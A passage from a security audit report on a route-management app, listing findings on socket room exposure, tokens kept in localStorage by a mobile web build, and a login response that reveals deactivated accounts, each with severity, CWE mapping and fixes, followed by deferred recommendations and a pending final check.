4. **Fix:** Emit route/location events to a route-specific room (`route:<routeId>`) or to the assigned driver's user room, and keep only company-wide, non-sensitive notifications in `company:<companyId>`. On connection, join `user:<id>` and optionally `company:<id>`, but authorize route-room joins against the driver assignment. Add a test that a driver socket does not receive another driver's route event.
5. **Possible false positive:** If the client never subscribes to other route ids and the payload contains no PII, the impact is lower. `route:reassigned` and incident payloads contain route/entity data, so the exposure is real.

### AUD-27 — Mobile web build stores tokens and PII in `localStorage`

1. **Severity:** Low. The mobile app targets native devices where `SecureStore` is used; the web build is not part of the documented deployment.
2. **CWE / OWASP:** CWE-922 Insecure Storage of Sensitive Information; OWASP A02:2021.
3. **Scenario:** If the Expo web build is ever served from the same origin as another app or exposed publicly, `session-storage.ts` falls back to `localStorage` for access/refresh tokens and the serialized user profile. Any XSS on that origin can read them.
4. **Fix:** If the web build is not a supported target, remove it from the build/deployment and document that. If it is supported, use the same HttpOnly-cookie design as the web app (AUD-22) instead of `localStorage`.
5. **Possible false positive:** The web build may never be deployed. The fallback is still dangerous if someone serves it.

### AUD-28 — Login reveals inactive account state

1. **Severity:** Low. The caller already needs a valid password, so this is not user enumeration; it is an information leak.
2. **CWE / OWASP:** CWE-204 Observable Response Discrepancy; OWASP A07:2021.
3. **Scenario:** A user whose account was deactivated enters the correct password. The API returns `403 {"message":"Usuario desactivado"}` instead of the generic `401`. The user learns that the credentials are valid and the account exists, and the same happens for a deactivated company. The audit plan requires a generic 401 on login.
4. **Fix:** Return the same `401` and the same message for invalid credentials, inactive users and inactive companies. Keep the detailed reason in server logs for support. Update the login tests to assert the generic response.
5. **Possible false positive:** Some products intentionally tell deactivated users why they cannot log in. The audit plan explicitly asks for a generic 401, so the current behavior does not meet it.

## Recommendations not fixed

- AUD-07 and AUD-10 require a business decision about the maximum number of stops and a database schema migration.
- AUD-11 changes the documented lazy-billing behavior and needs a business decision before adding a scheduler.
- AUD-19 requires dependency updates, which need approval.
- AUD-22 and AUD-23 require a web authentication/CSP design change; they are Medium and can be scheduled after deployment blockers.
- AUD-25 requires a retention period; it is `[TO BE DEFINED]`.

## Final check

Pending. Lint, typecheck, test and build results for `backend`, `web` and `mobile` will be recorded here after the fixes.
